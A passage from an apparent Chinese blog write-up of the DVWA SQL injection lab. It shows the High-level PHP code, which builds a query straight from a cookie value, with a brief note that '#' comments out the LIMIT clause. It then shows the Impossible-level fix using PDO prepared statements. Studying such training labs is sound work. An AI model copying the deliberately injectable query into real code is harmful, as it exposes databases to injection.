eNVa7/W/n0+qw3yiwtoXVb623+m6n37Bz5D+GoONr3R427k6RajgCQFZl9ms1AKSJcAQAA+EIAAbCEQAMhCMAGAhHADAQjgBgIBwBwEA4AoCBcAQAA+EIAAbCEQAMhCMAGAhHADAQjgBgIBwBwEA4AoCBcAQAA+EIAAbCEQAMhCMAGAhHADAQjgBgIBwBwEA4AoCBcAQAA+EIAAbCEQAMhCMAGP4HOiJIJL5K8JoAAAAASUVORK5CYII=" alt="image-20220823171721919"></p><h2 id="high-1" tabindex="-1"><a class="header-anchor" href="#high-1"><span>High</span></a></h2><h3 id="源代码-5" tabindex="-1"><a class="header-anchor" href="#源代码-5"><span>源代码</span></a></h3><div class="language-php line-numbers-mode" data-highlighter="prismjs" data-ext="php" data-title="php"><pre><code><span class="line"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></span>
<span class="line"></span>
<span class="line"><span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token keyword">isset</span><span class="token punctuation">(</span> <span class="token variable">$_COOKIE</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">&#39;id&#39;</span> <span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span></span>
<span class="line">    <span class="token comment">// Get input</span></span>
<span class="line">    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$_COOKIE</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">&#39;id&#39;</span> <span class="token punctuation">]</span><span class="token punctuation">;</span></span>
<span class="line">    <span class="token variable">$exists</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span></span>
<span class="line"></span>
<span class="line">    <span class="token keyword">switch</span> <span class="token punctuation">(</span><span class="token variable">$_DVWA</span><span class="token punctuation">[</span><span class="token string single-quoted-string">&#39;SQLI_DB&#39;</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span></span>
<span class="line">        <span class="token keyword">case</span> <span class="token constant">MYSQL</span><span class="token punctuation">:</span></span>
<span class="line">            <span class="token comment">// Check database</span></span>
<span class="line">            <span class="token variable">$query</span>  <span class="token operator">=</span> <span class="token string double-quoted-string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#39;<span class="token interpolation"><span class="token variable">$id</span></span>&#39; LIMIT 1;&quot;</span><span class="token punctuation">;</span></span>
<span class="line">            <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">&quot;___mysqli_ston&quot;</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token variable">$query</span> <span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// Removed &#39;or die&#39; to suppress mysql errors</span></span>
<span class="line"></span>
<span class="line">            <span class="token variable">$exists</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span></span>
<span class="line">            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$result</span> <span class="token operator">!==</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">{</span></span>
<span class="line">                <span class="token comment">// Get results</span></span>
<span class="line">                <span class="token keyword">try</span> <span class="token punctuation">{</span></span>
<span class="line">                    <span class="token variable">$exists</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">mysqli_num_rows</span><span class="token punctuation">(</span> <span class="token variable">$result</span> <span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// The &#39;@&#39; character suppresses errors</span></span>
<span class="line">                <span class="token punctuation">}</span> <span class="token keyword">catch</span><span class="token punctuation">(</span><span class="token class-name">Exception</span> <span class="token variable">$e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span></span>
<span class="line">                    <span class="token variable">$exists</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span></span>
<span class="line">                <span class="token punctuation">}</span></span>
<span class="line">            <span class="token punctuation">}</span></span>
<span class="line"></span>
<span class="line">            <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">is_null</span><span class="token punctuation">(</span><span class="token variable">$___mysqli_res</span> <span class="token operator">=</span> <span class="token function">mysqli_close</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">&quot;___mysqli_ston&quot;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token constant boolean">false</span> <span class="token punctuation">:</span> <span class="token variable">$___mysqli_res</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line">            <span class="token keyword">break</span><span class="token punctuation">;</span></span>
<span class="line">        <span class="token keyword">case</span> <span class="token constant">SQLITE</span><span class="token punctuation">:</span></span>
<span class="line">            <span class="token keyword">global</span> <span class="token variable">$sqlite_db_connection</span><span class="token punctuation">;</span></span>
<span class="line"></span>
<span class="line">            <span class="token variable">$query</span>  <span class="token operator">=</span> <span class="token string double-quoted-string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#39;<span class="token interpolation"><span class="token variable">$id</span></span>&#39; LIMIT 1;&quot;</span><span class="token punctuation">;</span></span>
<span class="line">            <span class="token keyword">try</span> <span class="token punctuation">{</span></span>
<span class="line">                <span class="token variable">$results</span> <span class="token operator">=</span> <span class="token variable">$sqlite_db_connection</span><span class="token operator">-&gt;</span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line">                <span class="token variable">$row</span> <span class="token operator">=</span> <span class="token variable">$results</span><span class="token operator">-&gt;</span><span class="token function">fetchArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line">                <span class="token variable">$exists</span> <span class="token operator">=</span> <span class="token variable">$row</span> <span class="token operator">!==</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span></span>
<span class="line">            <span class="token punctuation">}</span> <span class="token keyword">catch</span><span class="token punctuation">(</span><span class="token class-name">Exception</span> <span class="token variable">$e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span></span>
<span class="line">                <span class="token variable">$exists</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span></span>
<span class="line">            <span class="token punctuation">}</span></span>
<span class="line"></span>
<span class="line">            <span class="token keyword">break</span><span class="token punctuation">;</span></span>
<span class="line">    <span class="token punctuation">}</span></span>
<span class="line"></span>
<span class="line">    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$exists</span><span class="token punctuation">)</span> <span class="token punctuation">{</span></span>
<span class="line">        <span class="token comment">// Feedback for end user</span></span>
<span class="line">        <span class="token keyword">echo</span> <span class="token string single-quoted-string">&#39;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&#39;</span><span class="token punctuation">;</span></span>
<span class="line">    <span class="token punctuation">}</span></span>
<span class="line">    <span class="token keyword">else</span> <span class="token punctuation">{</span></span>
<span class="line">        <span class="token comment">// Might sleep a random amount</span></span>
<span class="line">        <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token function">rand</span><span class="token punctuation">(</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">5</span> <span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">3</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span></span>
<span class="line">            <span class="token function">sleep</span><span class="token punctuation">(</span> <span class="token function">rand</span><span class="token punctuation">(</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">4</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line">        <span class="token punctuation">}</span></span>
<span class="line"></span>
<span class="line">        <span class="token comment">// User wasn&#39;t found, so the page wasn&#39;t!</span></span>
<span class="line">        <span class="token function">header</span><span class="token punctuation">(</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">&#39;SERVER_PROTOCOL&#39;</span> <span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token string single-quoted-string">&#39; 404 Not Found&#39;</span> <span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line"></span>
<span class="line">        <span class="token comment">// Feedback for end user</span></span>
<span class="line">        <span class="token keyword">echo</span> <span class="token string single-quoted-string">&#39;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&#39;</span><span class="token punctuation">;</span></span>
<span class="line">    <span class="token punctuation">}</span></span>
<span class="line"><span class="token punctuation">}</span></span>
<span class="line"></span>
<span class="line"><span class="token delimiter important">?&gt;</span></span></span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="代码分析-5" tabindex="-1"><a class="header-anchor" href="#代码分析-5"><span>代码分析</span></a></h3><p>查询语句加了 LIMIT 1，但是我们可以利用 “#” 把它注释掉，跟 Low 等级基本没差</p><blockquote><p>除了查询不到结果时，服务器会等待一段时间再返回，这会对时间盲注造成混淆，不使用时间盲注即可！</p></blockquote><h3 id="漏洞利用-3" tabindex="-1"><a class="header-anchor" href="#漏洞利用-3"><span>漏洞利用</span></a></h3><p><img src="/blog/assets/image-20220823172035558-CB4rr5Gf.png" alt="image-20220823172035558"></p><h2 id="impossible-1" tabindex="-1"><a class="header-anchor" href="#impossible-1"><span>Impossible</span></a></h2><h3 id="源代码-6" tabindex="-1"><a class="header-anchor" href="#源代码-6"><span>源代码</span></a></h3><div class="language-php line-numbers-mode" data-highlighter="prismjs" data-ext="php" data-title="php"><pre><code><span class="line"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></span>
<span class="line"></span>
<span class="line"><span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token keyword">isset</span><span class="token punctuation">(</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">&#39;Submit&#39;</span> <span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span></span>
<span class="line">    <span class="token comment">// Check Anti-CSRF token</span></span>
<span class="line">    <span class="token function">checkToken</span><span class="token punctuation">(</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">&#39;user_token&#39;</span> <span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">&#39;session_token&#39;</span> <span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">&#39;index.php&#39;</span> <span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line">    <span class="token variable">$exists</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span></span>
<span class="line"></span>
<span class="line">    <span class="token comment">// Get input</span></span>
<span class="line">    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">&#39;id&#39;</span> <span class="token punctuation">]</span><span class="token punctuation">;</span></span>
<span class="line"></span>
<span class="line">    <span class="token comment">// Was a number entered?</span></span>
<span class="line">    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_numeric</span><span class="token punctuation">(</span> <span class="token variable">$id</span> <span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span></span>
<span class="line">        <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">intval</span> <span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line">        <span class="token keyword">switch</span> <span class="token punctuation">(</span><span class="token variable">$_DVWA</span><span class="token punctuation">[</span><span class="token string single-quoted-string">&#39;SQLI_DB&#39;</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span></span>
<span class="line">            <span class="token keyword">case</span> <span class="token constant">MYSQL</span><span class="token punctuation">:</span></span>
<span class="line">                <span class="token comment">// Check the database</span></span>
<span class="line">                <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token operator">-&gt;</span><span class="token function">prepare</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">&#39;SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;&#39;</span> <span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line">                <span class="token variable">$data</span><span class="token operator">-&gt;</span><span class="token function">bindParam</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">&#39;:id&#39;</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">,</span> <span class="token class-name static-context">PDO</span><span class="token operator">::</span><span class="token constant">PARAM_INT</span> <span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line">                <span class="token variable">$data</span><span class="token operator">-&gt;</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line"></span>
<span class="line">                <span class="token variable">$exists</span> <span class="token operator">=</span> <span class="token variable">$data</span><span class="token operator">-&gt;</span><span class="token function">rowCount</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line">                <span class="token keyword">break</span><span class="token punctuation">;</span></span>
<span class="line">            <span class="token keyword">case</span> <span class="token constant">SQLITE</span><span class="token punctuation">:</span></span>
<span class="line">                <span class="token keyword">global</span> <span class="token variable">$sqlite_db_connection</span><span class="token punctuation">;</span></span>
<span class="line"></span>
<span class="line">                <span class="token variable">$stmt</span> <span class="token operator">=</span> <span class="token variable">$sqlite_db_connection</span><span class="token operator">-&gt;</span><span class="token function">prepare</span><span class="token punctuation">(</span><span class="token string single-quoted-string">&#39;SELECT COUNT(first_name) AS numrows FROM users WHERE user_id = :id LIMIT 1;&#39;</span> <span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line">                <span class="token variable">$stmt</span><span class="token operator">-&gt;</span><span class="token function">bindValue</span><span class="token punctuation">(</span><span class="token string single-quoted-string">&#39;:id&#39;</span><span class="token punctuation">,</span><span class="token variable">$id</span><span class="token punctuation">,</span><span class="token constant">SQLITE3_INTEGER</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line">                <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token variable">$stmt</span><span class="token operator">-&gt;</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line">                <span class="token variable">$result</span><span class="token operator">-&gt;</span><span class="token function">finalize</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line">                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$result</span> <span class="token operator">!==</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">{</span></span>
<span class="line">                    <span class="token comment">// There is no way to get the number of rows returned</span></span>
<span class="line">                    <span class="token comment">// This checks the number of columns (not rows) just</span></span>
<span class="line">                    <span class="token comment">// as a precaution, but it won&#39;t stop someone dumping</span></span>
<span class="line">                    <span class="token comment">// multiple rows and viewing them one at a time.</span></span>
<span class="line"></span>
<span class="line">                    <span class="token variable">$num_columns</span> <span class="token operator">=</span> <span class="token variable">$result</span><span class="token operator">-&gt;</span><span class="token function">numColumns</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line">                    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$num_columns</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span></span>
<span class="line">                        <span class="token variable">$row</span> <span class="token operator">=</span> <span class="token variable">$result</span><span class="token operator">-&gt;</span><span class="token function">fetchArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line"></span>
<span class="line">                        <span class="token variable">$numrows</span> <span class="token operator">=</span> <span class="token variable">$row</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">&#39;numrows&#39;</span> <span class="token punctuation">]</span><span class="token punctuation">;</span></span>
<span class="line">                        <span class="token variable">$exists</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token variable">$numrows</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line">                    <span class="token punctuation">}</span></span>
<span class="line">                <span class="token punctuation">}</span></span>
<span class="line">                <span class="token keyword">break</span><span class="token punctuation">;</span></span>
<span class="line">        <span class="token punctuation">}</span></span>
<span class="line"></span>
<span class="line">    <span class="token punctuation">}</span></span>
<span class="line"></span>
<span class="line">    <span class="token comment">// Get results</span></span>
<span class="line">    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$exists</span><span class="token punctuation">)</span> <span class="token punctuation">{</span></span>
<span class="line">        <span class="token comment">// Feedback for end user</span></span>
<span class="line">        <span class="token keyword">echo</span> <span class="token string single-quoted-string">&#39;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&#39;</span><span class="token punctuation">;</span></span>
<span class="line">    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span></span>
<span class="line">        <span class="token comment">// User wasn&#39;t found, so the page wasn&#39;t!</span></span>
<span class="line">        <span class="token function">header</span><span class="token punctuation">(</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">&#39;SERVER_PROTOCOL&#39;</span> <span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token string single-quoted-string">&#39; 404 Not Found&#39;</span> <span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line"></span>
<span class="line">        <span class="token comment">// Feedback for end user</span></span>
<span class="line">        <span class="token keyword">echo</span> <span class="token string single-quoted-string">&#39;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&#39;</span><span class="token punctuation">;</span></span>
<span class="line">    <span class="token punctuation">}</span></span>
<span class="line"><span class="token punctuation">}</span></span>
<span class="line"></span>
<span class="line"><span class="token comment">// Generate Anti-CSRF token</span></span>
<span class="line"><span class="token function">generateSessionToken</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line"></span>
<span class="line"><span class="token delimiter important">?&gt;</span></span></span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="代码分析-6" tabindex="-1"><a class="header-anchor" href="#代码分析-6"><span>代码分析</span></a></h3><p>采用了 PDO 技术，防止代码和查询数据的混杂，Anti-CSRFtoken 机制的加入了进一步提高了安全性</p></div></div><footer class="page-meta"><div class="meta-item edit-link"><span class="xicon-container left meta-item-label"><!--[--><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewbox="0 0 32 32" class="xicon-icon" style="width:20px;height:20px;font-size:20px;color:;"><path d="M2 26h28v2H2z" fill="currentColor"></path><path d="M25.4 9c.8-.8.8-2 0-2.8l-3.6-3.6c-.8-.8-2-.8-2.8 0l-15 15V24h6.4l15-15zm-5-5L24 7.6l-3 3L17.4 7l3-3zM6 22v-3.6l10-10l3.6 3.6l-10 10H6z" fill="currentColor"></path></svg><!--]--><span class="xicon-content" style="color:;font-size:14px;"><!--[-->Edit this page<!--]--></span></span></div><div class="meta-item last-updated"><span class="xicon-container left meta-item-label"><!--[--><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewbox="0 0 32 32" class="xicon-icon" style="width:20px;height:20px;font-size:20px;color:;"><path d="M26 4h-4V2h-2v2h-8V2h-2v2H6c-1.1 0-2 .9-2 2v20c0 1.1.9 2 2 2h20c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 22H6V12h20v14zm0-16H6V6h4v2h2V6h8v2h2V6h4v4z" fill="currentColor"></path></svg><!--]--><span class="xicon-content" style="color:;font-size:14px;"><!--[-->Last Updated 2025/5/25 15:00:04<!--]--></span></span></div></footer><!----><!----></div><div class="page-catalog-container"><h5 class="tip">ON THIS PAGE</h5><ul><!--[--><!--[--><li class="page-catalog-menu-depth_2"><a aria-current="page" href="/blog/blogs/xxbj/Web_Security/Lab7_SQL_Injection.html#low" class="router-link-active router-link-exact-active link page-catalog-item page-catalog-item" aria-label="Low"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:;font-size:14px;"><!--[-->Low<!--]--></span></span><!--[--><!--]--></a></li><!--[--><li class="page-catalog-menu-depth_3"><a aria-current="page" href="/blog/blogs/xxbj/Web_Security/Lab7_SQL_Injection.html#源代码" class="router-link-active router-link-exact-active link page-catalog-item page-catalog-item" aria-label="源代码"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:;font-size:14px;"><!--[-->源代码<!--]--></span></span><!--[--><!--]--></a></li><!--]--><!--[--><li class="page-catalog-menu-depth_3"><a aria-current="page" href="/blog/blogs/xxbj/Web_Security/Lab7_SQL_Injection.html#代码分析" class="router-link-active router-link-exact-active link page-catalog-item page-catalog-item" aria-label="代码分析"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:;font-size:14px;"><!--[-->代码分析<!--]--></span></span><!--[--><!--]--></a></li><!--]--><!--[--><li class="page-catalog-menu-depth_3"><a aria-current="page" href="/blog/blogs/xxbj/Web_Security/Lab7_SQL_Injection.html#漏洞利用" class="router-link-active router-link-exact-active link page-catalog-item page-catalog-item" aria-label="漏洞利用"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:;font-size:14px;"><!--[-->漏洞利用<!--]--></span></span><!--[--><!--]--></a></li><!--]--><!--]--><!--[--><li class="page-catalog-menu-depth_2"><a aria-current="page" href="/blog/blogs/xxbj/Web_Security/Lab7_SQL_Injection.html#medium" class="router-link-active router-link-exact-active link page-catalog-item page-catalog-item" aria-label="Medium"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:;font-size:14px;"><!--[-->Medium<!--]--></span></span><!--[--><!--]--></a></li><!--[--><li class="page-catalog-menu-depth_3"><a aria-current="page" href="/blog/blogs/xxbj/Web_Security/Lab7_SQL_Injection.html#源代码-1" class="router-link-active router-link-exact-active link page-catalog-item page-catalog-item" aria-label="源代码"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:;font-size:14px;"><!--[-->源代码<!--]--></span></span><!--[--><!--]--></a></li><!--]--><!--[--><li class="page-catalog-menu-depth_3"><a aria-current="page" href="/blog/blogs/xxbj/Web_Security/Lab7_SQL_Injection.html#代码分析-1" class="router-link-active router-link-exact-active link page-catalog-item page-catalog-item" aria-label="代码分析"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:;font-size:14px;"><!--[-->代码分析<!--]--></span></span><!--[--><!--]--></a></li><!--]--><!--[--><li class="page-catalog-menu-depth_3"><a aria-current="page" href="/blog/blogs/xxbj/Web_Security/Lab7_SQL_Injection.html#漏洞例用" class="router-link-active router-link-exact-active link page-catalog-item page-catalog-item" aria-label="漏洞例用"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:;font-size:14px;"><!--[-->漏洞例用<!--]--></span></span><!--[--><!--]--></a></li><!--]--><!--]--><!--[--><li class="page-catalog-menu-depth_2"><a aria-current="page" href="/blog/blogs/xxbj/Web_Security/Lab7_SQL_Injection.html#high" class="router-link-active router-link-exact-active link page-catalog-item page-catalog-item" aria-label="High"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:;font-size:14px;"><!--[-->High<!--]--></span></span><!--[--><!--]--></a></li><!--[--><li class="page-catalog-menu-depth_3"><a aria-current="page" href="/blog/blogs/xxbj/Web_Security/Lab7_SQL_Injection.html#源代码-2" class="router-link-active router-link-exact-active link page-catalog-item page-catalog-item" aria-label="源代码"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:;font-size:14px;"><!--[-->源代码<!--]--></span></span><!--[--><!--]--></a></li><!--]--><!--[--><li class="page-catalog-menu-depth_3"><a aria-current="page" href="/blog/blogs/xxbj/Web_Security/Lab7_SQL_Injection.html#代码分析-2" class="router-link-active router-link-exact-active link page-catalog-item page-catalog-item" aria-label="代码分析"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:;font-size:14px;"><!--[-->代码分析<!--]--></span></span><!--[--><!--]--></a></li><!--]--><!--[--><li class="page-catalog-menu-depth_3"><a aria-current="page" href="/blog/blogs/xxbj/Web_Security/Lab7_SQL_Injection.html#漏洞例用-1" class="router-link-active router-link-exact-active link page-catalog-item page-catalog-item" aria-label="漏洞例用"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:;font-size:14px;"><!--[-->漏洞例用<!--]--></span></span><!--[--><!--]--></a></li><!--]--><!--]--><!--[--><li class="page-catalog-menu-depth_2"><a aria-current="page" href="/blog/blogs/xxbj/Web_Security/Lab7_SQL_Injection.html#impossible" class="router-link-active router-link-exact-active link page-catalog-item page-catalog-item" aria-label="Impossible"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:;font-size:14px;"><!--[-->Impossible<!--]--></span></span><!--[--><!--]--></a></li><!--]--><!--[--><li class="page-catalog-menu-depth_2"><a aria-current="page" href="/blog/blogs/xxbj/Web_Security/Lab7_SQL_Injection.html#low-1" class="router-link-active router-link-exact-active link page-catalog-item page-catalog-item" aria-label="Low"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:;font-size:14px;"><!--[-->Low<!--]--></span></span><!--[--><!--]--></a></li><!--[--><li class="page-catalog-menu-depth_3"><a aria-current="page" href="/blog/blogs/xxbj/Web_Security/Lab7_SQL_Injection.html#源代码-3" class="router-link-active router-link-exact-active link page-catalog-item page-catalog-item" aria-label="源代码"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:;font-size:14px;"><!--[-->源代码<!--]--></span></span><!--[--><!--]--></a></li><!--]--><!--[--><li class="page-catalog-menu-depth_3"><a aria-current="page" href="/blog/blogs/xxbj/Web_Security/Lab7_SQL_Injection.html#代码分析-3" class="router-link-active router-link-exact-active link page-catalog-item page-catalog-item" aria-label="代码分析"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:;font-size:14px;"><!--[-->代码分析<!--]--></span></span><!--[--><!--]--></a></li><!--]--><!--[--><li class="page-catalog-menu-depth_3"><a aria-current="page" href="/blog/blogs/xxbj/Web_Security/Lab7_SQL_Injection.html#漏洞利用-1" class="router-link-active router-link-exact-active link page-catalog-item page-catalog-item" aria-label="漏洞利用"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:;font-size:14px;"><!--[-->漏洞利用<!--]--></span></span><!--[--><!--]--></a></li><!--]--><!--]--><!--[--><li class="page-catalog-menu-depth_2"><a aria-current="page" 